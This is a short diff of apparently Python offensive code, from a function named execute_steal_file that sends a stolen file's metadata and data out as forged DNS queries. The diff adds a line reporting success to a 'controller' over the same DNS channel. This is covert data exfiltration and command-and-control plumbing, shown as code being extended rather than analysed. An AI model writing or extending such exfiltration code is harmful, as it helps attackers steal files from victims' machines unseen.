@@ -349,6 +349,9 @@ def execute_steal_file(filepath) -> bool:
     forge_dns_query_block(metadata, FILE_TRANSFER_IDENTIFICATION)
     # Send the file.
     forge_dns_query_block(file_data, FILE_TRANSFER_IDENTIFICATION)
+    # Notify the controller
+    query = forge_dns_query_stream("SUCCESS: Sending file...", GENERAL_MSG_IDENTIFICATION)
+    send_dns_query(query)
 
 
 def packet_handler(pkt):
